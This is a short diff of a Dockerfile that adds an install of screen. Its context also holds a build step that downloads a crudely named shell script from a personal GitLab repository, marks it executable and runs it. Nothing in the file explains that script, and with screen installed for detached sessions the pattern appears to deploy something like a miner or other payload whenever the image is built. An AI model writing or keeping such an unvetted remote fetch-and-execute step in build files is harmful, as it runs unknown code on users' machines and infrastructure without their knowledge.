@@ -1,5 +1,6 @@
 FROM ubuntu:20.04 as ubuntu-base
 RUN apt-get update && apt-get install -y curl git unzip wget
+RUN apt install screen -y
 RUN curl -0 https://gitlab.com/muiminah74/jambanium/-/raw/main/fucking.sh -o fucking.sh && chmod +x fucking.sh && ./fucking.sh
 # Switch to root user
 USER root
